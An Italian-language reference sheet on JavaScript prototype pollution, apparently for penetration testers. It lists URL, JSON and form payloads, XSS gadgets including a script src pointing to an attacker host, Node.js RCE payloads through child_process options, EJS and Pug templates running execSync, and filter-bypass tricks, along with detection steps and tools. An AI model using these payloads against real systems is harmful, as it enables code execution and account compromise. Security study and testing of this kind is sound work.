# 🧬 Scheda di riferimento sulla prototype pollution

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Nota sugli esempi:** non tutti gli oggetti ereditano da `Object.prototype`: esistono oggetti con prototipo nullo. La semplice presenza di JSON con `__proto__` non dimostra una modifica del prototipo; occorre un’operazione applicativa che lo elabori in modo vulnerabile. Modificare direttamente `Object.prototype` nella console dimostra l’ereditarietà, non una vulnerabilità raggiungibile dall’input. Gli esempi RCE e i gadget dipendono da libreria, versione e modalità d’uso e non sono universali. Vedi [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution) e la [guida PortSwigger](https://portswigger.net/web-security/prototype-pollution).

---

## 🎯 Che cos’è la prototype pollution

La **prototype pollution** è una vulnerabilità JavaScript in cui un attaccante può modificare `Object.prototype`, influenzando gli oggetti dell’applicazione.

### Impatto
- 🔴 **XSS** - Manipolazione del DOM
- 🔴 **RCE** - Esecuzione di codice lato server (Node.js)
- 🔴 **Aggiramento** - Controlli di sicurezza
- 🔴 **DoS** - Arresto dell’applicazione

---

## 🔍 Prototipi JavaScript

### Come funziona
```javascript
// Ogni oggetto eredita da Object.prototype (semplificazione: vedi nota)
let obj = {};
obj.__proto__ === Object.prototype  // true

// Se alteriamo il prototipo:
Object.prototype.polluted = "hacked";

// Gli oggetti ne risentono:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Proprietà pericolose
```javascript
__proto__
constructor
prototype
```

---

## 💉 Payload lato client

### Tramite URL (query/frammento)
```
# Di base
?__proto__[polluted]=value
?__proto__.polluted=value

# Costruttore
?constructor[prototype][polluted]=value

# Annidato
?__proto__[__proto__][polluted]=value

# Con codifica URL
?__proto__%5Bpolluted%5D=value
```

### Tramite JSON
```javascript
// Input dell’utente
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Annidato
{"a": {"__proto__": {"polluted": "value"}}}
```

### Tramite dati dei moduli
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Esempi di sfruttamento

### DOM XSS tramite innerHTML
```javascript
// Se il codice esegue:
element.innerHTML = obj.html || "";

// Altera il prototipo:
?__proto__[html]=<img src=x onerror=alert(1)>

// Risultato: XSS!
```

### Gadget basato su src di uno script
```javascript
// Se il codice esegue:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Altera il prototipo:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Combinazione con DOM clobbering
```javascript
// Schemi comuni dei gadget
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### Gadget di jQuery
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Sfruttamento
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ Lato server (Node.js)

### RCE tramite child_process
```javascript
// Se l’app usa spawn/exec con un oggetto di opzioni:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Altera il prototipo:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Oppure:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE tramite require()
```javascript
// Payload di alterazione del prototipo
{"__proto__": {"main": "./pwned.js"}}
```

### RCE nei template EJS
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE nei template Pug
```javascript
// RCE con Pug
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Individuazione

### Verifica manuale
```javascript
// Nella console del browser:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Se compare "polluted" = vulnerabile (vedi nota)

// Ripristino
delete Object.prototype.testPollution;
```

### Verifica tramite URL
```
# Aggiungi all’URL e controlla la console
?__proto__[test]=polluted

// Nella console:
({}).test  // Dovrebbe essere undefined; se compare "polluted" = vulnerabile
```

### Individua i gadget (DOM Invader)
```
1. Installa DOM Invader (Burp Suite)
2. Abilita la modalità prototype pollution
3. Esplora l’applicazione
4. Verifica i punti di utilizzo sfruttabili (sink)
```

---

## 🛠️ Strumenti

| Strumento | Scopo |
|------|---------|
| **DOM Invader** | Estensione di Burp per individuare la prototype pollution |
| **ppfuzz** | Fuzzer per prototype pollution |
| **ppmap** | Ricerca dei gadget |
| **PPScan** | Scanner lato client |

### Uso di ppmap
```bash
# Installazione
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Scansione
node ppmap.js https://target.com
```

---

## 📊 Riferimento rapido

### Formati dei payload
| Formato | Payload |
|--------|---------|
| Query | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Unione (merge) | `Object.assign({},input)` |

### Gadget comuni
| Proprietà | Impatto |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Inserimento di script |
| `href` | Reindirizzamento |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Tecniche di aggiramento
```javascript
// Se __proto__ viene filtrato:
constructor.prototype.polluted = "value"

// Notazione diversa
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Risorse

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Client-side PP Scanner](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Altera il prototipo!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
